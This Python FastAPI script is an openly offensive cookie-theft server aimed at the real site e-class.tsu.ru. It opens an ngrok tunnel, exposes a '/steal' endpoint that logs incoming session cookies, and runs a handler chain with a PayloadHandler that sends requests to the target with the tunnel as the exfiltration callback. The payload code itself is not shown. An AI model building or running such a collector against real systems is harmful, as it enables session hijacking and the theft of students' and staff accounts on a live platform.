from fastapi import FastAPI, HTTPException, Request
import uvicorn
from pyngrok import ngrok, conf
from config import TARGET_URL, get_base_headers
from models import ExecuteRequestData, ExecuteResponseData
from context import RequestContext
from handlers import (
    SetupRequestHandler,
    PayloadHandler,
    ExecutionHandler,
    LoggingHandler,
)
from exceptions import ChainException
from selenium_start_point import run_capture_logic, close_driver

app = FastAPI(
    title="Chain of Responsibility Service",
    description="Executes requests to e-class.tsu.ru using Chain of Responsibility pattern.",
    version="1.0.0",
)


NGROK_PUBLIC_URL = None


def start_ngrok():
    global NGROK_PUBLIC_URL

    conf.get_default().region = "us"

    tunnel = ngrok.connect(8000, bind_tls=True)
    NGROK_PUBLIC_URL = tunnel.public_url
    print(f"Ngrok tunnel started: {NGROK_PUBLIC_URL}")


def shutdown_ngrok():
    ngrok.disconnect(NGROK_PUBLIC_URL)
    ngrok.kill()
    print("Ngrok tunnel shutdown")


@app.get("/steal")
async def steal_cookie(request: Request):
    cookie = request.query_params.get("cookie", "No cookie received")
    print(f"Received stolen cookie: {cookie}")
    return {"message": "Cookie received", "cookie": cookie}


@app.post(
    "/execute-chain", response_model=ExecuteResponseData, tags=["Chain Execution"]
)
async def execute_chain_endpoint(request_data: ExecuteRequestData):
    print(f"\n--- Received API request for session_id: {request_data.session_id} ---")

    if not NGROK_PUBLIC_URL:
        raise HTTPException(status_code=500, detail="Ngrok tunnel not initialized")

    request_context = RequestContext(
        url=TARGET_URL,
        base_headers=get_base_headers(),
        session_id=request_data.session_id,
        callback_url=NGROK_PUBLIC_URL,
    )

    logging_handler = LoggingHandler()
    setup_handler = SetupRequestHandler()
    payload_handler = PayloadHandler()
    execution_handler = ExecutionHandler()

    logging_handler.set_next(setup_handler).set_next(payload_handler).set_next(
        execution_handler
    )

    try:
        print("--- Starting chain of handlers ---")
        final_context = logging_handler.handle_request(request_context)
        print("--- Chain execution completed ---")

        if final_context.response:
            response_text = final_context.response.text
            return ExecuteResponseData(
                success=True,
                message="Request successfully sent to target server.",
                target_status_code=final_context.response.status_code,
                target_response_preview=(
                    response_text[:100] + "..." if response_text else None
                ),
            )
        else:
            return ExecuteResponseData(
                success=False,
                message="Chain completed, but no response from target server.",
                target_status_code=None,
            )

    except ChainException as e:
        raise HTTPException(status_code=500, detail=f"Chain error: {e.message}")


if __name__ == "__main__":
    try:

        start_ngrok()
        print("--- Starting FastAPI server ---")
        print("Visit http://127.0.0.1:8000/docs for API documentation")
        uvicorn.run(app, host="127.0.0.1", port=8000)
        driver = run_capture_logic()

    finally:

        shutdown_ngrok()
        close_driver(driver)
